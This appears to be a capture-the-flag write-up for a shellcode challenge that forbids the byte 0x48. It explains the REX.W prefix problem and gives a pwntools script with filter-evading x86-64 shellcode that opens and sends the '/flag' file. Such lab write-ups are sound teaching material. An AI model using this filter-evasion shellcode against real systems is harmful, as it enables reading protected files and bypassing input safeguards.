# Challenge Description

**Challenge:** `/challenge/ello-ackers`  
**Goal:** Write shellcode to read the flag.  

**Constraint:**  
The challenge reads bytes from stdin and executes them, but with a strict filter:

> No `H` bytes (0x48) allowed.

---

# Phase 1: The Naive Approach (Failure)

My initial thought was to use standard x64 shellcode to perform an open -> read -> write chain.  
I attempted to construct the registers directly using 64-bit operations.

---

## The Failed Script

```python
from pwn import *
context.arch = 'amd64'

assembly = """
    mov rax, 0x67616c662f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall
"""

payload = asm(assembly)
p = process('/challenge/ello-ackers')
p.send(payload)
p.interactive()
```

---

## The Error

```text
Executing filter...
This challenge requires that your shellcode have no H bytes!
Failed filter at byte 0!
```

---

## Analysis

Why `H`?
In ASCII, the character `H` corresponds to hex value **0x48**.
In x86-64 assembly, `0x48` is the REX.W prefix.

```asm
0:  48 b8 2f 66 6c 61 ...
```

The `48` here is the forbidden byte.

---

# Phase 3: The Final Solution

```python
#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

assembly = """
    xor esi, esi            
    push rsi
    push rsi
    
    mov dword ptr [rsp+1], 0x67616c66
    mov byte ptr [rsp], 0x2f
    
    push rsp
    pop rdi
    
    push 2
    pop rax
    syscall
    
    mov esi, eax
    
    push 1
    pop rdi
    
    cdq
    
    mov r10d, 0x1000
    
    push 40
    pop rax
    syscall
    
    mov al, 60
    syscall
"""

payload = asm(assembly)

if b'\x48' in payload:
    print("[-] Failed: Payload still contains 0x48!")
else:
    print("[+] Success: Payload is clean. Sending...")
    p = process('/challenge/ello-ackers')
    p.send(payload)
    p.interactive()
```
